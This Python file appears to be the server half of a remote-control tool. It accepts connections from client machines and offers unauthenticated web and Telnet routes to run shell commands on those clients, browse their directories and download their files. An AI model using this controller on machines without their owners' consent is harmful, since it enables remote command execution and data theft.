from starlette.background import BackgroundTask
from starlette.responses import FileResponse
from fastapi import FastAPI
import threading
import uvicorn
import socket
import json
import time
import os

socketHost = 'localhost'
socketPort = 8088
webapi = FastAPI()
server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
socket_conns = {}

# region - TCP Connections

def listen_tcp():
    while True:
        client_socket,address = server.accept() # Accept TCP connection
        conn_name = address[0] + ':' + str(address[1])
        recv_data = client_socket.recv(1024)
        print(recv_data.decode())
        try:
            json_head = json.loads(recv_data.decode())
            print('Step in json')
            if json_head['type'] == 'client':
                print('Connection ' + conn_name + '\n - ' + json_head['content']) # Print connection base info
                socket_conns[conn_name] = client_socket # add connection to dic
        except json.JSONDecodeError:
            Telnet(client_socket, address).start()


# endregion

# region Telnet connection

class Telnet(threading.Thread):
    def __init__(self, conn, add):
        threading.Thread.__init__(self)
        self.inputstr = ''
        self.connection = conn
        self.address = add
    def run(self):
        ii = 0
        self.connection.send(b'Hello controller')
        self.connection.send(b'\n>')
        while True:
            buf = self.connection.recv(1024)
            if buf.rfind(b'\n') > -1:
                print("**-" + self.inputstr)
                return_arr = self.inputstr.split(' ')
                match return_arr[0]:
                    case 'list':
                        func_return = list_connections()
                        for key in func_return.keys():
                            self.connection.send(key.encode())
                    case 'shell':
                        func_return = exec_shell(conn_address=return_arr[1], command=' '.join(return_arr[2:]))
                        self.connection.send(func_return.encode('gbk'))
                self.inputstr = ''
                self.connection.send(b'\n>')
            else:
                self.inputstr += buf.decode()
            if ii == 0:
                self.connection.send(buf)
            ii += 1
            continue

# endregion

# region - WebAPI

def recv_dyn_socket(client, type, content): # Receive dynamic length socket data
    client.send(json.dumps({
        'type': type,
        'content': content
    }).encode())
    recv_length = 2048
    while True:
        recv_data = client.recv(recv_length).decode()
        json_data = json.loads(recv_data)
        match json_data['type']:
            case 'length':
                recv_length = json_data['content']
                client.send(json.dumps({
                    'type': 'okay'
                }).encode())
                continue
            case 'data':
                return json_data['content']


@webapi.get("/") # Get server version
def server_version():
    return { 'Server-Version': '0.1' }


@webapi.get("/list/") # Get client list
def list_connections():
    conn_list = dict()
    for key in list(socket_conns.keys()):
        conn_list[key] = str(socket_conns[key])
    return conn_list


@webapi.get("/shell/{conn_address}") # Execute shell in client
def exec_shell(conn_address:str, command:str=None):
    print(conn_address + ':' + command)
    try:
        client = socket_conns[conn_address]
        return recv_dyn_socket(client, 'shell', command)
    except:
        return 'Client Error : '


@webapi.get("/dir/{conn_address}") # List dir in client
def scan_dir(conn_address:str, path:str=None):
    try:
        client = socket_conns[conn_address]
        return recv_dyn_socket(client, 'scandir', path)
    except Exception as e:
        return 'Client Error : ' + str(e)


@webapi.get("/info/{conn_address}") # List dir in client
def get_info(conn_address:str):
    try:
        client = socket_conns[conn_address]
        return json.loads(recv_dyn_socket(client, 'info', ''))
    except Exception as e:
        return 'Client Error : ' + str(e)


@webapi.get("/download/{conn_address}") # Download file from client
def download_file(conn_address:str, path:str=None):
    try:
        client = socket_conns[conn_address]
        buf = bytearray.fromhex(recv_dyn_socket(client, 'downfile', path))
        temp_file = os.getcwd() + os.path.sep + 'temp' + os.path.sep + os.path.split(path)[-1]
        with open(temp_file, 'wb') as file:
            file.write(buf)
        return FileResponse(
            temp_file,
            filename=os.path.split(path)[-1],
            background=BackgroundTask(lambda: os.remove(temp_file))
            )
    except Exception as e:
        return 'Client Error : ' + str(e)

#endregion

# region - Heartbeat check alive

def client_heartbeat():
    while True:
        for key in list(socket_conns.keys()):
            try:
                heartbeat = socket_conns[key]
                heartbeat.send(json.dumps({
                    'type': 'heartbeat'
                }).encode())
            except socket.error as e:
                print('Connection lost ' + key + '\n - ' + e.strerror)
                socket_conns[key].close()
                socket_conns.pop(key)
        time.sleep(1)

# endregion

# region - Run service in thread

def fastapi(): # fastapi service
    uvicorn.run(webapi, host='0.0.0.0', port=8090)


def tcplistener(): # socket tcp service
    server.bind((socketHost, socketPort))
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.listen(128)
    print('\033[0;32mINFO\033[0m' + ':     Socket listen on' + socketHost + ':' + str(socketPort))
    listen_tcp()

# endregion

if __name__ == "__main__":
    if not os.path.exists(os.getcwd() + os.path.sep + 'temp'): os.mkdir(os.getcwd() + os.path.sep + 'temp')
    fastAPI = threading.Thread(target=fastapi, name='FastAPI').start()
    tcpListener = threading.Thread(target=tcplistener, name='TCPListener').start()
    heartbeat = threading.Thread(target=client_heartbeat, name='HeartBeat').start()
